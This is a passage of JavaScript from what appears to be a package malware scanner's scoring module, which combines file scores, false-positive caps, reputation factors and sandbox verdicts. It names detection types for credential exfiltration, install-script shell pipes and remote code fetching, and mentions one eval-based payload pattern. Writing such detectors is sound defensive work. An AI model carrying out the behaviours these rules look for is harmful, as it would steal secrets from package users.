  // at HIGH. Catches apache-arrow-14 (curl_env_exfil + lifecycle_env_exfil compound).
  const criticalPkgTypes = new Set(
    packageLevelThreats.filter(t => t.severity === 'CRITICAL' && !t.unscopedCompound).map(t => t.type)
  );
  if (criticalPkgTypes.size >= 2) {
    packageScore = Math.max(packageScore, 75);
  }

  // 5. Cross-file bonus: aggregate signal from non-max files
  // A package with 3 files each scoring 20 is more suspicious than 1 file scoring 20.
  // Add 25% of each non-max file's score as a bonus, capped at 25.
  // P4: Only count files that have at least one MEDIUM+ threat.
  // Files with only LOW findings are noise in large packages and shouldn't amplify the score.
  const bonusEligibleScores = Object.entries(fileScores)
    .filter(([file]) => fileHasMediumPlus[file])
    .map(([, score]) => score)
    .sort((a, b) => b - a);
  let crossFileBonus = 0;
  if (bonusEligibleScores.length > 1) {
    for (let i = 1; i < bonusEligibleScores.length; i++) {
      crossFileBonus += Math.ceil(bonusEligibleScores[i] * 0.25);
    }
    crossFileBonus = Math.min(crossFileBonus, 25);
  }

  // 5b. Blue Team v8: Package-level boost signals — detect dissimulation patterns
  applyPackageLevelBoosts(deduped, fileScores, fileGroups, packageLevelThreats);
  // Recompute packageScore after boosts may have added new package-level threats
  const boostPackageThreats = deduped.filter(t => isPackageLevelThreat(t) && t.boostSignal);
  if (boostPackageThreats.length > 0) {
    packageScore = computeGroupScore([...packageLevelThreats, ...boostPackageThreats]);
    if (packageScore >= 25 && [...packageLevelThreats, ...boostPackageThreats].some(t => t.severity === 'CRITICAL' && !t.unscopedCompound)) {
      packageScore = Math.max(packageScore, 50);
    }
  }

  // 5c. Blue Team v8: lifecycle_plus_finding boost — lifecycle + any finding = +10 package score
  const hasActiveLifecycleForBoost = packageLevelThreats.some(t =>
    t.type === 'lifecycle_script' && t.severity !== 'LOW'
  );
  const hasAnyFileFinding = fileLevelThreats.some(t => t.severity !== 'LOW');
  let lifecycleBoost = 0;
  if (hasActiveLifecycleForBoost && hasAnyFileFinding) {
    lifecycleBoost = 10;
  }

  // 6. Intent coherence bonus: additive score from source→sink pairs
  let intentBonus = 0;
  if (intentResult && intentResult.intentScore > 0) {
    // Cap intent bonus at 30 to prevent over-inflation
    intentBonus = Math.min(intentResult.intentScore, 30);
  }

  // 6b. v2.10.73 P3: Degraded (quick-scan) non-CRITICAL threats contribute a
  // bounded bonus to the final score — they are visible in the report but never
  // inflate max_file_score. Cap at 15 (= 5 MEDIUM threats OR 1 HIGH + small).
  // Rationale: quick-scan is regex-only, cannot distinguish top-level from
  // exported function scope, so detections are low-confidence by construction.
  let degradedScore = 0;
  if (degradedNonCriticalThreats.length > 0) {
    for (const t of degradedNonCriticalThreats) {
      degradedScore += _severityWeights[t.severity] || 0;
    }
    degradedScore = Math.min(15, degradedScore);
  }

  // 7. Final score = max file score + cross-file bonus + intent bonus + package-level score + lifecycle boost + degraded bucket, capped at 100
  let riskScore = Math.min(MAX_RISK_SCORE, maxFileScore + crossFileBonus + intentBonus + packageScore + lifecycleBoost + degradedScore);

  // 7b. MT-1: Score ceiling for packages without lifecycle scripts.
  // 56% of real malware uses install scripts. Packages without lifecycle that score high
  // (minified bundles, frameworks) are quasi-exclusively false positives.
  // Cap at 35 to prevent webhook triggers (threshold ~20-25 post-reputation).
  // Bypass: HC malice types, compound detections — these are never benign regardless of lifecycle.
  const _hasLifecycle = deduped.some(t =>
    t.type === 'lifecycle_script' || t.type === 'lifecycle_file_exec' ||
    t.type === 'lifecycle_shell_pipe' || t.type === 'lifecycle_remote_fetch'
  );
  const _hasHC = deduped.some(t => HIGH_CONFIDENCE_MALICE_TYPES.has(t.type));
  const _hasCompound = deduped.some(t => t.compound === true);
  // v2.10.89: staged_payload + suspicious_domain(HIGH) = confirmed C2 eval, bypass MT-1 cap
  // json-spacer, reactvora: eval(data.content) from jsonkeeper.com is always malicious
  const _hasStagedC2 = deduped.some(t => t.type === 'staged_payload') &&
    deduped.some(t => t.type === 'suspicious_domain' && t.severity === 'HIGH');
  if (!_hasLifecycle && !_hasHC && !_hasCompound && !_hasStagedC2) {
    riskScore = Math.min(riskScore, 35);
  }

  // 8. Old global score for comparison (sum of ALL findings)
  const globalRiskScore = computeGroupScore(deduped);

  // 9. Severity counts (global, for summary display)
  const criticalCount = deduped.filter(t => t.severity === 'CRITICAL').length;
  const highCount = deduped.filter(t => t.severity === 'HIGH').length;
  const mediumCount = deduped.filter(t => t.severity === 'MEDIUM').length;
  const lowCount = deduped.filter(t => t.severity === 'LOW').length;

  const riskLevel = riskScore >= _riskThresholds.CRITICAL ? 'CRITICAL'
                  : riskScore >= _riskThresholds.HIGH ? 'HIGH'
                  : riskScore >= _riskThresholds.MEDIUM ? 'MEDIUM'
                  : riskScore > 0 ? 'LOW'
                  : 'SAFE';

  return {
    riskScore, riskLevel, globalRiskScore,
    maxFileScore, crossFileBonus, intentBonus, packageScore, mostSuspiciousFile, fileScores,
    criticalCount, highCount, mediumCount, lowCount
  };
}

// ============================================
// v2.10.97: CONTEXTUAL FP POST-FILTER
// ============================================
// Deterministic score caps for packages matching well-known FP clusters.
// Each feature has 100% precision on 302 human-reviewed packages (zero
// malware misclassified).  Applied AFTER calculateRiskScore() so that
// compound boosts and lifecycle floors have already had their say.
const {
  bundleWithoutInstallScripts,
  installUrlGithubReleases,
  networkDestinationFirstParty,
  gitHookSourceLocal,
  typosquatScopedPackage,
  obfuscationWithoutVector,
  placeholderAntiDepConfusion,
  mcpServerEnvAccess,
  vendorCliSdk,
  aiAgentBot,
} = require('./ml/feature-extractor.js');

/**
 * Apply contextual FP score caps to a scan result.
 * Mutates result.summary.riskScore / riskLevel in-place.
 * Returns array of { feature, cap } describing applied caps (empty if none).
 */
function applyContextualFPCaps(result, pkgMeta) {
  if (!result || !result.summary) return [];

  const meta = {
    name: pkgMeta && pkgMeta.name,
    registryMeta: {
      scripts: (pkgMeta && pkgMeta.scripts) || {},
      description: (pkgMeta && pkgMeta.description) || '',
      homepage: (pkgMeta && pkgMeta.homepage) || '',
      dependencies: (pkgMeta && pkgMeta.dependencies),
      devDependencies: (pkgMeta && pkgMeta.devDependencies),
      // v2.11.22 — used by F9 (mcp_server_env_access) identity check.
      keywords: (pkgMeta && pkgMeta.keywords),
      bin: (pkgMeta && pkgMeta.bin),
    },
  };

  const applied = [];

  // F7: placeholder anti-dep-confusion → MAX 20
  if (placeholderAntiDepConfusion(result, meta)) {
    applied.push({ feature: 'placeholder_anti_dep_confusion', cap: 20 });
  }
  // F1: minified bundle without install scripts → MAX 30
  if (bundleWithoutInstallScripts(result, meta)) {
    applied.push({ feature: 'bundle_without_install_scripts', cap: 30 });
  }
  // F3: credential destination first-party API → MAX 30
  if (networkDestinationFirstParty(result, meta)) {
    applied.push({ feature: 'network_destination_first_party', cap: 30 });
  }
  // F9: legit MCP installer/server with env_access on provider keys → MAX 30
  if (mcpServerEnvAccess(result, meta)) {
    applied.push({ feature: 'mcp_server_env_access', cap: 30 });
  }
  // F2: binary installer from GitHub Releases → MAX 35
  if (installUrlGithubReleases(result)) {
    applied.push({ feature: 'install_url_github_releases', cap: 35 });
  }
  // F4: git hooks from local source → MAX 35
  if (gitHookSourceLocal(result)) {
    applied.push({ feature: 'git_hook_source_local', cap: 35 });
  }
  // F6: commercial obfuscation without attack vector → MAX 35
  if (obfuscationWithoutVector(result)) {
    applied.push({ feature: 'obfuscation_without_vector', cap: 35 });
  }
  // F10: legit vendor CLI/SDK with intrinsic credential handling → MAX 35
  if (vendorCliSdk(result, meta)) {
    applied.push({ feature: 'vendor_cli_sdk', cap: 35 });
  }
  // F11: legit AI agent / bot / multi-LLM orchestrator → MAX 35
  if (aiAgentBot(result, meta)) {
    applied.push({ feature: 'ai_agent_bot', cap: 35 });
  }
  // F5: typosquat on scoped package → suppress typosquat points
  if (typosquatScopedPackage(result, meta)) {
    applied.push({ feature: 'typosquat_scoped_package', cap: -1 });
  }

  if (applied.length === 0) return applied;

  // Apply the tightest (lowest) cap
  const caps = applied.filter(a => a.cap > 0);
  const lowestCap = caps.length > 0 ? Math.min(...caps.map(a => a.cap)) : Infinity;

  if (lowestCap < result.summary.riskScore) {
    result.summary.riskScore = lowestCap;
    result.summary.riskLevel =
      lowestCap >= _riskThresholds.CRITICAL ? 'CRITICAL'
        : lowestCap >= _riskThresholds.HIGH ? 'HIGH'
        : lowestCap >= _riskThresholds.MEDIUM ? 'MEDIUM'
        : lowestCap > 0 ? 'LOW' : 'SAFE';
  }

  // F5: subtract typosquat points from score
  if (applied.find(a => a.feature === 'typosquat_scoped_package')) {
    const typoPoints = result.threats
      .filter(t => t.type === 'typosquat_detected' || t.type === 'lifecycle_typosquat')
      .reduce((s, t) => s + (t.points || 0), 0);
    if (typoPoints > 0) {
      result.summary.riskScore = Math.max(0, result.summary.riskScore - typoPoints);
      const rs = result.summary.riskScore;
      result.summary.riskLevel =
        rs >= _riskThresholds.CRITICAL ? 'CRITICAL'
          : rs >= _riskThresholds.HIGH ? 'HIGH'
          : rs >= _riskThresholds.MEDIUM ? 'MEDIUM'
          : rs > 0 ? 'LOW' : 'SAFE';
    }
  }

  return applied;
}

// ============================================
// Hybrid v3 Phase 4: METADATA-FIRST REPUTATION FACTOR
// ============================================
// Applied AFTER all severity-based adjustments. Multiplies the final score by
// a factor derived from package metadata (age, version count, weekly
// downloads, repository presence, author breadth). AUC analysis on 246 FP
// + 179 MW labeled corpus shows these are the strongest single discriminants
// (top features 0.75-0.81 AUC, vs no rule type above 0.6).
//
// No-op when metadata is absent (CLI scans without registry context).
// Gated behind MUADDIB_METADATA_FACTOR=1 — the equivalent computation has
// existed monitor-side (src/monitor/webhook.js#computeReputationFactor) for
// webhook decisions only; this lifts it into the persisted score so that
// reports, alerts, and downstream consumers all see the corrected number.
const REPUTATION_FACTOR_BOUNDS = { min: 0.10, max: 1.5 };

function _hasNumeric(v) { return typeof v === 'number' && !Number.isNaN(v); }

function _factorFromMetadata(meta) {
  let factor = 1.0;
  let signalsApplied = 0;
  // Age (AUC 0.81 — strongest single discriminator). Old packages = benign.
  const age = meta.age_days ?? meta.package_age_days;
  if (_hasNumeric(age) && age > 0) {
    if (age > 1825) factor -= 0.5;       // 5+ years
    else if (age > 730) factor -= 0.3;   // 2+ years
    else if (age > 365) factor -= 0.15;  // 1+ year
    else if (age < 7) factor += 0.3;     // freshly published
    else if (age < 30) factor += 0.2;
    signalsApplied++;
  }
  // Version count (AUC 0.81). Many published versions = mature project.
  // Skip when value is missing (null/undefined/0) — 0 is the "metadata absent"
  // sentinel in ml-training data and cannot be distinguished from "single
  // unpublished version" without additional context.
  const versions = meta.version_count;
  if (_hasNumeric(versions) && versions > 0) {
    if (versions > 200) factor -= 0.3;
    else if (versions > 50) factor -= 0.2;
    else if (versions > 20) factor -= 0.1;
    else if (versions === 1) factor += 0.2;
    else if (versions <= 2) factor += 0.15;
    signalsApplied++;
  }
  // Weekly downloads (AUC 0.80). Top-tier traffic = hard to weaponise silently.
  const downloads = meta.weekly_downloads;
  if (_hasNumeric(downloads) && downloads > 0) {
    if (downloads > 1000000) factor -= 0.4;
    else if (downloads > 100000) factor -= 0.2;
    else if (downloads > 50000) factor -= 0.1;
    else if (downloads < 10) factor += 0.15;
    else if (downloads < 100) factor += 0.1;
    signalsApplied++;
  }
  // Repository presence (AUC 0.75). Tri-state: true → known repo, false →
  // explicitly absent (suspicious), null/undefined → unknown (no signal).
  if (meta.has_repository === false) {
    factor += 0.15;
    signalsApplied++;
  } else if (meta.has_repository === true) {
    // Slight reassurance — mature established projects almost always have repo
    factor -= 0.05;
    signalsApplied++;
  }
  // Author package count (AUC 0.75). 1 package = fresh author.
  const authorPkgs = meta.author_package_count;
  if (_hasNumeric(authorPkgs) && authorPkgs > 0) {
    if (authorPkgs === 1) factor += 0.15;
    else if (authorPkgs > 50) factor -= 0.1;
    signalsApplied++;
  }
  // FPR plan Chantier 4 : advanced registry signals. These complement the
  // basic AUC-tuned signals above. The first three are *boosts* used as a
  // safety net for Chantier 5's mature stable cap : an account takeover on a
  // mature package would otherwise be hidden by a passive multiplier.
  //
  //   maintainer_change_recent  -> +0.20 (Shai-Hulud / Axios pattern in 2026)
  //   publish_cadence_anomaly   -> +0.10 (publish frequency suddenly off)
  //   stable_ownership_2y       -> -0.15 (suppression douce, only structural)
  if (meta.maintainer_change_recent === true) {
    factor += 0.20;
    signalsApplied++;
  }
  if (meta.publish_cadence_anomaly === true) {
    factor += 0.10;
    signalsApplied++;
  }
  if (meta.stable_ownership_2y === true) {
    factor -= 0.15;
    signalsApplied++;
  }
  // If no signals applied (metadata fully absent), return neutral 1.0 rather
  // than the default-shaped factor — avoid spurious adjustments on rows where
  // the registry data is simply missing.
  if (signalsApplied === 0) return 1.0;
  return Math.max(REPUTATION_FACTOR_BOUNDS.min, Math.min(REPUTATION_FACTOR_BOUNDS.max, factor));
}

function applyReputationFactor(result, metadata) {
  if (!result || !result.summary || !metadata) return null;
  // FPR plan : the reputation factor describes "how trustworthy this package
  // looks TODAY in the registry". Applying it to a historical / pinned-old /
  // vendored version with the same name would import today's good reputation
  // onto a code snapshot that may have been compromised at the time.
  // When both version fields are present we require them to match. When the
  // scan version is unknown (CLI scanning a directory without version field),
  // we fail open : skip the factor entirely rather than apply a multiplier
  // we cannot situate in time.
  if (
    typeof metadata.latest_version === 'string' &&
    typeof metadata.scan_version === 'string' &&
    metadata.latest_version !== metadata.scan_version
  ) {
    return null;
  }
  if (
    typeof metadata.latest_version === 'string' &&
    typeof metadata.scan_version !== 'string'
  ) {
    return null;
  }
  const factor = _factorFromMetadata(metadata);
  if (factor === 1.0) {
    result.summary.reputationFactor = 1.0;
    return null;
  }
  const oldScore = result.summary.riskScore;
  const newScore = Math.max(0, Math.min(MAX_RISK_SCORE, Math.round(oldScore * factor)));
  result.summary.riskScore = newScore;
  result.summary.reputationFactor = factor;
  const rs = newScore;
  result.summary.riskLevel = rs >= _riskThresholds.CRITICAL ? 'CRITICAL'
    : rs >= _riskThresholds.HIGH ? 'HIGH'
      : rs >= _riskThresholds.MEDIUM ? 'MEDIUM'
        : rs > 0 ? 'LOW' : 'SAFE';
  return { factor, oldScore, newScore };
}

// ============================================
// FPR plan Chantier 5 : MATURE STABLE PACKAGE CAP
// ============================================
//
// Caps the risk score at MEDIUM (25) when a package satisfies *all* of the
// following structural conditions, none of which are recoverable by simple
// rule heuristics :
//
//   - >= 5 years old
//   - >= 50 published versions
//   - >= 10 000 weekly downloads
//   - stable_ownership_2y (registry signal from Chantier 4)
//   - no HIGH_CONFIDENCE_MALICE_TYPES present
//   - no IOC match
//   - no delta-added threats (skipped while Chantier 3 ships - the cap still
//     applies because the caller has not provided the field, and we treat
//     that as "no positive evidence of fresh malicious additions")
//
// This is the single structural suppression introduced by the FPR plan and
// always sits BETWEEN applyContextualFPCaps (which it composes with) and
// applySingleFireCriticalFloor (which can override it on hard signals). The
// reputation factor downstream multiplies what's left.
//
// Disabled by default ; gated behind MUADDIB_MATURE_CAP=1 until measured
// against the full evaluation corpus.

const MATURE_CAP_SCORE = 25;
const MATURE_MIN_AGE_DAYS = 5 * 365;
const MATURE_MIN_VERSION_COUNT = 50;
const MATURE_MIN_WEEKLY_DOWNLOADS = 10000;

const MATURE_CAP_IOC_TYPES = new Set([
  'ioc_match',
  'ioc_string_match',
  'known_malicious_hash',
  'known_malicious_package',
  'pypi_malicious_package',
  'shai_hulud_marker',
  'dependency_ioc_match'
]);

function applyMatureStableCap(result, registryMeta) {
  if (!result || !result.summary || !Array.isArray(result.threats)) return null;
  if (!registryMeta) return null;

  const reasons = {};

  // FPR plan : the cap MUST only fire when scanning the package's current
  // latest version. Historical / pinned-old / vendored versions of mature
  // packages bypass the cap so we never mask a static fixture of a real
  // attack (eslint-scope 3.7.2, chalk 5.6.1, coa 2.0.3, rc, solana-web3js,
  // ledgerhq-connect-kit etc.). Both fields must be present and equal.
  if (
    typeof registryMeta.latest_version !== 'string' ||
    typeof registryMeta.scan_version !== 'string' ||
    registryMeta.latest_version !== registryMeta.scan_version
  ) {
    return null;
  }
  reasons.scan_version = registryMeta.scan_version;
  reasons.latest_version = registryMeta.latest_version;

  if (!_hasNumeric(registryMeta.age_days) || registryMeta.age_days < MATURE_MIN_AGE_DAYS) {
    return null;
  }
  reasons.age_days = registryMeta.age_days;

  if (!_hasNumeric(registryMeta.version_count) || registryMeta.version_count < MATURE_MIN_VERSION_COUNT) {
    return null;
  }
  reasons.version_count = registryMeta.version_count;

  if (!_hasNumeric(registryMeta.weekly_downloads) || registryMeta.weekly_downloads < MATURE_MIN_WEEKLY_DOWNLOADS) {
    return null;
  }
  reasons.weekly_downloads = registryMeta.weekly_downloads;

  if (registryMeta.stable_ownership_2y !== true) {
    return null;
  }
  reasons.stable_ownership_2y = true;

  // delta_added_threats is provided by Chantier 3 ; treat undefined as 0 to
  // ship Chantier 5 standalone. When C3 wires through a real number, the
  // condition `> 0` correctly disables the cap on suspicious deltas.
  const deltaAdded = registryMeta.delta_added_threats;
  if (typeof deltaAdded === 'number' && deltaAdded > 0) {
    return null;
  }
  reasons.delta_added_threats = deltaAdded == null ? 0 : deltaAdded;

  for (const t of result.threats) {
    if (HIGH_CONFIDENCE_MALICE_TYPES.has(t.type)) return null;
    if (MATURE_CAP_IOC_TYPES.has(t.type)) return null;
  }

  if (result.summary.riskScore <= MATURE_CAP_SCORE) {
    return null; // already at/below cap, nothing to do
  }

  const oldScore = result.summary.riskScore;
  result.summary.riskScore = MATURE_CAP_SCORE;
  result.summary.matureStableCap = true;
  result.summary.matureStableCapReasons = reasons;
  const rs = MATURE_CAP_SCORE;
  result.summary.riskLevel =
    rs >= _riskThresholds.CRITICAL ? 'CRITICAL'
      : rs >= _riskThresholds.HIGH ? 'HIGH'
        : rs >= _riskThresholds.MEDIUM ? 'MEDIUM'
          : rs > 0 ? 'LOW' : 'SAFE';
  return { applied: true, oldScore, newScore: MATURE_CAP_SCORE, reasons };
}

/**
 * Hybrid v3 Phase 1: apply CRITICAL floor when a deterministic single-fire
 * type is present at HIGH+ severity. Mutates result.summary.riskScore /
 * riskLevel in-place. Always raises score, never lowers — cannot regress TPR.
 * Returns the list of triggering types (empty if no floor applied).
 *
 * Called AFTER applyContextualFPCaps so the floor wins over any contextual
 * reduction (an IOC hash match remains CRITICAL even if the package matches
 * a benign FP cluster pattern like "minified bundle without install").
 */
function applySingleFireCriticalFloor(result) {
  if (!result || !result.summary || !Array.isArray(result.threats)) return [];
  const triggers = [];
  for (const t of result.threats) {
    if (!SINGLE_FIRE_CRITICAL_TYPES.has(t.type)) continue;
    const rank = _SEV_RANK[t.severity];
    if (rank === undefined || rank < SINGLE_FIRE_MIN_SEVERITY_RANK) continue;
    triggers.push({ type: t.type, severity: t.severity, file: t.file });
  }
  if (triggers.length === 0) return [];
  if (result.summary.riskScore < SINGLE_FIRE_CRITICAL_FLOOR) {
    result.summary.riskScore = SINGLE_FIRE_CRITICAL_FLOOR;
    const rs = result.summary.riskScore;
    result.summary.riskLevel =
      rs >= _riskThresholds.CRITICAL ? 'CRITICAL'
        : rs >= _riskThresholds.HIGH ? 'HIGH'
          : rs >= _riskThresholds.MEDIUM ? 'MEDIUM'
            : rs > 0 ? 'LOW' : 'SAFE';
  }
  return triggers;
}

// ── Sandbox verdict scoring contract ──
// Applied AFTER the sandbox completes a run triggered by evaluateSandboxTrigger.
// The verdict adjusts the static riskScore based on dynamic confirmation.
// Static stays the primary detection layer; sandbox is a borderline tribunal.
const SANDBOX_VERDICT_CONFIRMED_FLOOR = 75;
const SANDBOX_VERDICT_CHAIN_FLOOR = 60;
const SANDBOX_VERDICT_CLEAN_DELTA = 8;

const _CRITICAL_PRELOAD_TYPES = new Set([
  'sandbox_network_after_sensitive_read',
  'sandbox_known_exfil_domain',
  'sandbox_timer_delay_critical',
  'canary_exfiltration',
  'sandbox_honey_read',
  'sandbox_persistence_write',
  'sandbox_npm_self_invoke',
  'sandbox_runtime_deobfuscation_executed'
]);

const _HIGH_COMPOUND_TYPES = new Set([
  'sandbox_preload_sensitive_read',
  'sandbox_exec_suspicious',
  'sandbox_network_outlier',
  'sandbox_execve_chain_depth',
  'sandbox_credential_target_read'
]);

/**
 * Classify a sandbox run into a verdict and apply the score contract.
 *
 * Verdicts:
 *   - MALICIOUS_CONFIRMED: >=1 critical preload signal OR honey read correlated
 *     with non-registry outbound. Floor score at 75.
 *   - MALICIOUS_CHAIN: >=2 high-severity compound signals in the same run.
 *     Floor score at 60.
 *   - CLEAN_HIGH_CONFIDENCE: install completed, no fingerprint detected, no
 *     sandbox findings beyond DNS resolutions/registry traffic. Apply -8 delta.
 *   - INCONCLUSIVE: gVisor unavailable, install crashed, or fingerprint
 *     detected. Score unchanged, warning attached.
 *
 * Mutates result.summary.riskScore, riskLevel, and adds result.summary.sandboxVerdict.
 *
 * @param {object} result - Scan result with summary.{riskScore, riskLevel, ...}.
 * @param {object} sandboxResult - Output of runSandbox(): {score, severity, findings, raw_report, suspicious, inconclusive}.
 * @returns {{verdict:string, oldScore:number, newScore:number, signals:string[]}|null}
 */
function applySandboxVerdict(result, sandboxResult) {
  if (!result || !result.summary || !sandboxResult) return null;

  const findings = Array.isArray(sandboxResult.findings) ? sandboxResult.findings : [];
  const oldScore = result.summary.riskScore || 0;

  // Inconclusive path: explicit flag, or score === -1 sentinel.
  if (sandboxResult.inconclusive === true || sandboxResult.score === -1) {
    result.summary.sandboxVerdict = {
      verdict: 'INCONCLUSIVE',
      oldScore,
      newScore: oldScore,
      signals: findings.filter(f => f && f.type).map(f => f.type)
    };
    return result.summary.sandboxVerdict;
  }

  const findingTypes = findings.filter(f => f && f.type).map(f => f.type);
  const criticalSignals = findingTypes.filter(t => _CRITICAL_PRELOAD_TYPES.has(t));
  const highSignals = findingTypes.filter(t => _HIGH_COMPOUND_TYPES.has(t));

  // MALICIOUS_CONFIRMED: any single critical preload/honey signal is enough.
  if (criticalSignals.length >= 1) {
    const newScore = Math.max(oldScore, SANDBOX_VERDICT_CONFIRMED_FLOOR);
    result.summary.riskScore = newScore;
    _refreshRiskLevel(result);
    result.summary.sandboxVerdict = {
      verdict: 'MALICIOUS_CONFIRMED',
      oldScore,
      newScore,
      signals: criticalSignals
    };
    return result.summary.sandboxVerdict;
  }

  // MALICIOUS_CHAIN: 2+ high-severity compound signals from preload analyzer.
  if (highSignals.length >= 2) {
    const newScore = Math.max(oldScore, SANDBOX_VERDICT_CHAIN_FLOOR);
    result.summary.riskScore = newScore;
    _refreshRiskLevel(result);
    result.summary.sandboxVerdict = {
      verdict: 'MALICIOUS_CHAIN',
      oldScore,
      newScore,
      signals: highSignals
    };
    return result.summary.sandboxVerdict;
  }

  // CLEAN_HIGH_CONFIDENCE: install completed, sandbox score 0, no findings
  // beyond INFO (DNS resolutions). Anti-fingerprint must NOT have been
  // detected (fingerprint detection is treated as inconclusive above).
  const actionableFindings = findings.filter(f => f && f.severity && f.severity !== 'INFO');
  const installCompleted = sandboxResult.score === 0 && !sandboxResult.inconclusive;
  if (installCompleted && actionableFindings.length === 0) {
    const newScore = Math.max(0, oldScore - SANDBOX_VERDICT_CLEAN_DELTA);
    result.summary.riskScore = newScore;
    _refreshRiskLevel(result);
    result.summary.sandboxVerdict = {
      verdict: 'CLEAN_HIGH_CONFIDENCE',
      oldScore,
      newScore,
      signals: []
    };
    return result.summary.sandboxVerdict;
  }

  // Default: signals present but below thresholds — record verdict, no change.
  result.summary.sandboxVerdict = {
    verdict: 'INCONCLUSIVE',
    oldScore,
    newScore: oldScore,
    signals: findingTypes
  };
  return result.summary.sandboxVerdict;
}

function _refreshRiskLevel(result) {
  const rs = result.summary.riskScore;
  result.summary.riskLevel =
    rs >= _riskThresholds.CRITICAL ? 'CRITICAL'
      : rs >= _riskThresholds.HIGH ? 'HIGH'
        : rs >= _riskThresholds.MEDIUM ? 'MEDIUM'
          : rs > 0 ? 'LOW' : 'SAFE';
}

// FPR plan Chantier 3 - delta-aware decay. Re-exported here so the pipeline
// can call it after applyFPReductions and before applyCompoundBoosts (matching
// the plan : compounds operate on freshly-introduced patterns, never on stable
// long-standing ones, so we suppress noise BEFORE compound boosts run).
const { applyDeltaMultiplier } = require('./scoring/delta-multiplier.js');

module.exports = {
  SEVERITY_WEIGHTS, RISK_THRESHOLDS, MAX_RISK_SCORE, CONFIDENCE_FACTORS,
  SINGLE_FIRE_CRITICAL_TYPES, SINGLE_FIRE_CRITICAL_FLOOR, DECAY_ALPHA,
  REPUTATION_FACTOR_BOUNDS,
  MATURE_CAP_SCORE, MATURE_MIN_AGE_DAYS, MATURE_MIN_VERSION_COUNT, MATURE_MIN_WEEKLY_DOWNLOADS,
  SANDBOX_VERDICT_CONFIRMED_FLOOR, SANDBOX_VERDICT_CHAIN_FLOOR, SANDBOX_VERDICT_CLEAN_DELTA,
  applyMatureStableCap, applySandboxVerdict, applyDeltaMultiplier,
  isPackageLevelThreat, computeGroupScore, computeGroupScoreDecay,
  applyFPReductions, applyCompoundBoosts, calculateRiskScore,
  applyConfigOverrides, resetConfigOverrides, getSeverityWeights, getRiskThresholds,
  applyContextualFPCaps, applySingleFireCriticalFloor, applyReputationFactor
};
